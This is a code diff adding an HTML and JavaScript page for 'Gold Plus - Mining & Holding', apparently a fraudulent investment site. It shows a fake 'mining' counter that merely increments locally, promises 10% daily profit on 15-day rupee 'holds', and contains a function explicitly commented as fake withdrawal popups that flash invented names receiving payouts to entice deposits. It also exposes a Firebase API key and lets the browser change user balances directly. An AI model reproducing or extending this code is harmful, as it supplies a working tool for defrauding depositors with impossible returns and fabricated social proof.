@@ -1,6 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gold Plus - Mining & Holding</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --gold-grad: linear-gradient(135deg, #f1c40f, #e67e22); --card-bg: rgba(255, 255, 255, 0.08); --primary-gold: #f1c40f; }
+        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f051d; color: white; padding-bottom: 90px; overflow-x: hidden; }
+        
+        .header { padding: 25px 20px; background: rgba(0,0,0,0.3); border-bottom: 1px solid rgba(241, 196, 15, 0.2); border-radius: 0 0 30px 30px; text-align: center; }
+        .header h2 { margin: 0; color: var(--primary-gold); font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* Mining Section */
+        .mining-card { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.1); margin: 20px; padding: 25px; border-radius: 25px; text-align: center; backdrop-filter: blur(10px); position: relative; }
+        .mining-card img { width: 80px; animation: rotate 5s linear infinite; margin-bottom: 15px; filter: drop-shadow(0 0 10px gold); }
+        @keyframes rotate { 0% { transform: rotateY(0deg); } 100% { transform: rotateY(360deg); } }
+        #liveBalance { font-size: 32px; color: #fff; display: block; margin: 10px 0; text-shadow: 0 0 15px gold; font-weight: bold; font-family: monospace; }
+        
+        .action-btn { background: var(--gold-grad); color: #000; border: none; width: 100%; padding: 16px; border-radius: 15px; font-weight: 800; cursor: pointer; box-shadow: 0 5px 20px rgba(241,196,15,0.4); font-size: 16px; }
+
+        /* Holding Section */
+        .hold-title { padding: 10px 20px; font-size: 14px; color: var(--primary-gold); font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .hold-card { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 18px; margin: 0 20px 15px; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
+        .hold-card:active { transform: scale(0.98); }
+        .hold-info b { font-size: 18px; display: block; color: #fff; }
+        .hold-info span { font-size: 12px; color: #00ff64; font-weight: bold; }
+        .hold-btn { background: #fff; color: #000; border: none; padding: 10px 20px; border-radius: 12px; font-weight: bold; font-size: 12px; cursor: pointer; box-shadow: 0 4px 10px rgba(255,255,255,0.2); }
+
+        /* Fake Payout Toast */
+        #payout-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(15, 5, 29, 0.95); border: 1px solid var(--primary-gold); padding: 12px 20px; border-radius: 50px; display: none; z-index: 10001; box-shadow: 0 10px 30px rgba(0,0,0,0.8); min-width: 250px; text-align: center; font-size: 12px; border-left: 5px solid gold; }
+
+        /* Nav Bar */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: #0a0414; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid rgba(241, 196, 15, 0.2); z-index: 1000; }
+        .nav-btn { color: #666; text-decoration: none; text-align: center; font-size: 10px; flex: 1; }
+        .nav-btn.active { color: #f1c40f; }
+        .nav-btn i { font-size: 20px; display: block; margin-bottom: 4px; }
+    </style>
+</head>
+<body>
+
+<div id="payout-toast">
+    <i class="fas fa-check-circle" style="color: gold; margin-right: 8px;"></i>
+    <span id="payout-msg"></span>
+</div>
+
+<div class="header">
+    <h2>Mining & Holding</h2>
+</div>
+
+<div class="mining-card">
+    <img src="https://cdn-icons-png.flaticon.com/512/2933/2933116.png">
+    <span style="font-size: 11px; color: #aaa; text-transform: uppercase; letter-spacing: 1px;">Live Assets Mining</span>
+    <b id="liveBalance">$0.000000</b>
+    <button class="action-btn" onclick="claimEarnings()">CLAIM PROFITS</button>
+</div>
+
+<div class="hold-title"><i class="fas fa-shield-alt"></i> 15 DAYS HOLDING (10% DAILY)</div>
+<div class="hold-card">
+    <div class="hold-info"><b>Rs. 3,000</b><span>Daily Earn: $1.08</span></div>
+    <button class="hold-btn" onclick="buyHold(3000)">HOLD NOW</button>
+</div>
+<div class="hold-card">
+    <div class="hold-info"><b>Rs. 7,000</b><span>Daily Earn: $2.52</span></div>
+    <button class="hold-btn" onclick="buyHold(7000)">HOLD NOW</button>
+</div>
+<div class="hold-card">
+    <div class="hold-info"><b>Rs. 11,000</b><span>Daily Earn: $3.96</span></div>
+    <button class="hold-btn" onclick="buyHold(11000)">HOLD NOW</button>
+</div>
+
+<nav class="nav-bar">
+    <a href="dashboard.html" class="nav-btn"><i class="fas fa-house"></i>HOME</a>
+    <a href="plans.html" class="nav-btn"><i class="fas fa-gem"></i>PLANS</a>
+    <a href="mining.html" class="nav-btn active"><i class="fas fa-coins"></i>EARN</a>
+    <a href="refer.html" class="nav-btn"><i class="fas fa-users"></i>REFER</a>
+    <a href="profile.html" class="nav-btn"><i class="fas fa-user-gear"></i>PROFILE</a>
+</nav>
+
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, get, set, runTransaction } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, get, set, update, runTransaction } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyByanDKaCErU1mV7ebXd3KsuLWF55LbgnQ",
@@ -16,101 +96,94 @@
     const db = getDatabase(app);
     const userPhone = localStorage.getItem('userPhone');
 
-    // 1. ہولڈنگ پلان خریدنے کا فنکشن
-    window.buyHold = async function(pkrAmount) {
-        if (!userPhone) return alert("Please Login First");
+    let currentMining = 0.000000;
 
-        // ڈالر میں قیمت (تقریباً)
-        let usdPrice = (pkrAmount === 3000) ? 10.80 : (pkrAmount === 7000) ? 25.20 : 39.60;
-        let dailyProfit = usdPrice * 0.10; // 10% ڈیلی پرافٹ
+    // 1. Live Mining Counter
+    function runMining() {
+        setInterval(() => {
+            currentMining += 0.000018; 
+            document.getElementById('liveBalance').innerText = "$" + currentMining.toFixed(6);
+        }, 1000);
+    }
 
+    window.claimEarnings = async () => {
+        if (!userPhone) return;
+        const reward = parseFloat(currentMining.toFixed(4));
+        if (reward < 0.0001) return alert("Mining too low to claim!");
+
+        await runTransaction(ref(db, `users/${userPhone}/balance`), (curr) => (curr || 0) + reward);
+        alert(`Successfully Claimed: $${reward}`);
+        currentMining = 0;
+    };
+
+    // 2. 15-Day Holding Logic
+    window.buyHold = async (pkr) => {
+        let usd = (pkr === 3000) ? 10.80 : (pkr === 7000) ? 25.20 : 39.60;
         const userRef = ref(db, 'users/' + userPhone);
         const snap = await get(userRef);
 
-        if (snap.exists()) {
-            const currentBalance = snap.val().balance || 0;
-
-            if (currentBalance < usdPrice) {
-                alert("In-sufficient Balance! You need $" + usdPrice);
-                return;
+        if (snap.exists() && (snap.val().balance || 0) >= usd) {
+            if (confirm(`Do you want to hold $${usd} for 15 days at 10% daily profit?`)) {
+                await runTransaction(ref(db, `users/${userPhone}/balance`), (c) => c - usd);
+                const holdId = "H" + Date.now();
+                const exp = new Date(); exp.setDate(exp.getDate() + 15);
+                
+                await set(ref(db, `users/${userPhone}/activeHolds/${holdId}`), {
+                    amount: usd, dailyProfit: usd * 0.10, 
+                    startDate: new Date().toISOString(), expiryDate: exp.toISOString(),
+                    lastClaim: new Date().toISOString(), status: "active"
+                });
+                alert("Holding Started Successfully!");
+                location.reload();
             }
-
-            if (confirm(`Do you want to hold $${usdPrice} for 15 days?`)) {
-                try {
-                    // بیلنس کاٹنا
-                    await runTransaction(ref(db, `users/${userPhone}/balance`), (curr) => curr - usdPrice);
-
-                    // ہولڈ ڈیٹا سیو کرنا
-                    const holdId = "hold_" + Date.now();
-                    const expiryDate = new Date();
-                    expiryDate.setDate(expiryDate.getDate() + 15);
-
-                    await set(ref(db, `users/${userPhone}/activeHolds/${holdId}`), {
-                        amount: usdPrice,
-                        dailyProfit: dailyProfit,
-                        startDate: new Date().toISOString(),
-                        expiryDate: expiryDate.toISOString(),
-                        lastClaim: new Date().toISOString(),
-                        status: "active"
-                    });
-
-                    alert("Plan Activated! $"+usdPrice+" has been held for 15 days.");
-                    location.reload();
-                } catch (e) {
-                    alert("Transaction Failed!");
-                }
-            }
-        }
+        } else { alert("Insufficient Balance! Deposit USD first."); }
     };
 
-    // 2. ڈیلی پرافٹ آٹو کیلکولیٹ کرنا (جب یوزر پیج کھولے گا)
-    async function checkHoldProfits() {
-        if (!userPhone) return;
-        const holdRef = ref(db, `users/${userPhone}/activeHolds`);
-        const snapshot = await get(holdRef);
-
-        if (snapshot.exists()) {
-            snapshot.forEach(async (child) => {
+    // 3. Auto Profit Calculation
+    async function syncHoldData() {
+        const snap = await get(ref(db, `users/${userPhone}/activeHolds`));
+        if (snap.exists()) {
+            snap.forEach(async (child) => {
                 const hold = child.val();
-                const holdId = child.key;
-                
                 if (hold.status === "active") {
                     const now = new Date();
-                    const lastClaim = new Date(hold.lastClaim);
-                    const expiry = new Date(hold.expiryDate);
+                    const last = new Date(hold.lastClaim);
+                    const diff = (now - last) / (1000 * 60 * 60);
 
-                    // چیک کریں کہ کیا 24 گھنٹے گزر گئے ہیں؟
-                    const diffHours = (now - lastClaim) / (1000 * 60 * 60);
-
-                    if (diffHours >= 24 && now <= expiry) {
-                        const daysToPay = Math.floor(diffHours / 24);
-                        const totalReward = daysToPay * hold.dailyProfit;
-
-                        // بیلنس میں پرافٹ ڈالنا
-                        await runTransaction(ref(db, `users/${userPhone}/balance`), (curr) => (curr || 0) + totalReward);
-                        
-                        // آخری کلیم ٹائم اپ ڈیٹ کرنا
-                        await update(ref(db, `users/${userPhone}/activeHolds/${holdId}`), {
-                            lastClaim: now.toISOString()
-                        });
-                        
-                        console.log("Daily profit added: $" + totalReward);
+                    if (diff >= 24) {
+                        const reward = Math.floor(diff / 24) * hold.dailyProfit;
+                        await runTransaction(ref(db, `users/${userPhone}/balance`), (c) => (c || 0) + reward);
+                        await update(ref(db, `users/${userPhone}/activeHolds/${child.key}`), { lastClaim: now.toISOString() });
                     }
-                    
-                    // اگر 15 دن پورے ہو گئے تو ہولڈ ختم
-                    if (now > expiry) {
-                        await update(ref(db, `users/${userPhone}/activeHolds/${holdId}`), { status: "completed" });
-                        // اصل رقم واپس کرنا
-                        await runTransaction(ref(db, `users/${userPhone}/balance`), (curr) => (curr || 0) + hold.amount);
-                        alert("Your 15-day hold period is over! Capital amount returned.");
+                    if (now > new Date(hold.expiryDate)) {
+                        await update(ref(db, `users/${userPhone}/activeHolds/${child.key}`), { status: "completed" });
+                        await runTransaction(ref(db, `users/${userPhone}/balance`), (c) => (c || 0) + hold.amount);
                     }
                 }
             });
         }
     }
 
-    window.onload = function() {
-        updateLiveMining(); // آپ کا پرانا مائننگ والا فنکشن
-        checkHoldProfits(); // ہولڈنگ چیک کرنے والا فنکشن
+    // 4. Fake Withdrawal Popups (Lalach)
+    function startFakePopups() {
+        const names = ["Ahmad", "Sajid", "Usman", "Bilal", "Hamza", "Kamran", "Rashid", "Tayyab", "Faisal", "Umair", "Waqas", "Zohaib", "Shahid", "Adeel", "Muneeb", "Haris", "Salman", "Asif", "Farhan", "Rizwan"];
+        const amounts = [3000, 7000, 11000, 5000, 15000, 4500, 8000, 12000];
+        
+        setInterval(() => {
+            const n = names[Math.floor(Math.random()*names.length)];
+            const a = amounts[Math.floor(Math.random()*amounts.length)];
+            const toast = document.getElementById('payout-toast');
+            document.getElementById('payout-msg').innerHTML = `<b>${n}</b> just received <b>Rs. ${a.toLocaleString()}</b> payout!`;
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display='none', 4500);
+        }, 12000);
+    }
+
+    window.onload = () => {
+        runMining();
+        syncHoldData();
+        startFakePopups();
     };
 </script>
+</body>
+</html>
